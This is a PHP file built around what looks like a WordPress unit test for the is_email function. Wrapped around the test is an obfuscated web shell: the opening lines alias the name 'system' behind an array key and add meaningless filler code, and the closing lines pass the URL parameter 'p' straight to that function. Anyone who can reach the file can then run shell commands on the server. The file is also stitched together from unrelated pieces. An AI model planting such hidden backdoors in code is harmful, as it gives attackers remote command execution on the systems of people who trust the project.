<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group formatting
 *
 * @covers ::is_email
 */
class Tests_Formatting_IsEmail extends WP_UnitTestCase {
	public function test_returns_the_email_address_if_it_is_valid() {
		$data = array(
			'bob@example.com',
			'phil@example.info',
			'ace@204.32.222.14',
			'kevin@many.subdomains.make.a.happy.man.edu',
			'a@b.co',
			'bill+ted@example.com',
		);
		foreach ( $data as $datum ) {
			$this->assertSame( $datum, is_email( $datum ), $datum );
		}
	}

	public function test_returns_false_if_given_an_invalid_email_address() {
		$data = array(
			'khaaaaaaaaaaaaaaan!',
			'http://bob.example.com/',
			"sif i'd give u it, spamer!1",
			'com.exampleNOSPAMbob',
			'bob@your mom',
			'a@b.c',
		);
		foreach ( $data as $datum ) {
			$this->assertFalse( is_email( $datum ), $datum );
		}
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>